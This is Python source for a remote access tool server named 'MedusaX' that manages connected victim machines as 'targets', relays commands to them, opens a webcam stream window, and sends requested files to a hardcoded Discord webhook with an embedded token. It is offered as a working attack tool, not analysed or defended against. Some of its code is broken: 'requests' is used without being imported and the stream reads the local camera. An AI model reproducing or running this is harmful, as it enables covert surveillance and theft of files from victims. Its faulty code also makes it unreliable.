import socket
import threading
import subprocess
import sys
import os
from PyQt5.QtWidgets import QApplication, QLabel, QMainWindow, QVBoxLayout, QWidget
from PyQt5.QtGui import QImage, QPixmap
from PyQt5.QtCore import QThread, pyqtSignal
import cv2

clients = {}
selected_client = None
server_running = True
client_connected = threading.Event()

class StreamThread(QThread):
    image_signal = pyqtSignal(QImage)

    def __init__(self, client_socket):
        super().__init__()
        self.client_socket = client_socket

    def run(self):
        cap = cv2.VideoCapture(0)
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            rgb_image = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            h, w, ch = rgb_image.shape
            bytes_per_line = ch * w
            qt_image = QImage(rgb_image.data, w, h, bytes_per_line, QImage.Format_RGB888)
            self.image_signal.emit(qt_image)
        cap.release()

class MainWindow(QMainWindow):
    def __init__(self, client_socket):
        super().__init__()
        self.client_socket = client_socket
        self.setWindowTitle("MedusaX - Stream")
        self.setGeometry(100, 100, 800, 600)
        self.image_label = QLabel(self)
        self.layout = QVBoxLayout()
        self.layout.addWidget(self.image_label)
        self.container = QWidget()
        self.container.setLayout(self.layout)
        self.setCentralWidget(self.container)
        self.stream_thread = StreamThread(self.client_socket)
        self.stream_thread.image_signal.connect(self.update_image)
        self.stream_thread.start()

    def update_image(self, qt_image):
        self.image_label.setPixmap(QPixmap.fromImage(qt_image))

def handle_client(client_socket, client_address):
    global selected_client
    clients[client_address[0]] = client_socket
    print(f"[+] Client connected: {client_address[0]}")
    client_connected.set()
    while True:
        try:
            message = client_socket.recv(1024).decode()
            if message == "!stream":
                app = QApplication(sys.argv)
                window = MainWindow(client_socket)
                window.show()
                app.exec_()
            elif message.startswith("!download"):
                _, filepath = message.split(" ")
                if os.path.exists(filepath):
                    webhook_url = "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"
                    with open(filepath, "rb") as f:
                        requests.post(webhook_url, files={"file": f})
                    print("[*] Sending...")
                    print("[+] Sent!")
                else:
                    print(f"[-] File not found: {filepath}")
            elif message.startswith("!set target"):
                _, target_ip = message.split(" ")
                if target_ip in clients:
                    selected_client = clients[target_ip]
                    print(f"[+] Target set: {target_ip}")
                else:
                    print(f"[-] Target not found: {target_ip}")
            elif message.startswith("!remove target"):
                _, target_ip = message.split(" ")
                if target_ip in clients:
                    selected_client = None
                    print(f"[+] Target removed: {target_ip}")
                else:
                    print(f"[-] Target not found: {target_ip}")
            elif message == "!list":
                for ip in clients:
                    print(ip + (" (selected)" if ip == selected_client else ""))
            elif selected_client:
                selected_client.send(message.encode())
            else:
                print("[-] No target selected.")
        except Exception as e:
            print(f"[-] Error: {e}")
            break
    client_socket.close()
    del clients[client_address[0]]
    print(f"[-] Client disconnected: {client_address[0]}")

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 9999))
    server_socket.listen(5)
    print("[*] Server listening on port 9999")
    while server_running:
        client_socket, client_address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

def prompt():
    global server_running
    client_connected.wait()  # Wait until a client is connected
    while server_running:
        command = input("medusax > ").strip()
        if command == "exit":
            server_running = False
        elif command.startswith("!"):
            if selected_client:
                selected_client.send(command.encode())
            else:
                print("[-] No target selected.")
        else:
            print("[-] Invalid command")

if __name__ == "__main__":
    server_thread = threading.Thread(target=start_server)
    server_thread.start()
    try:
        prompt()
    except KeyboardInterrupt:
        print("[-] Server stopped.")
        server_running = False
        sys.exit(0)
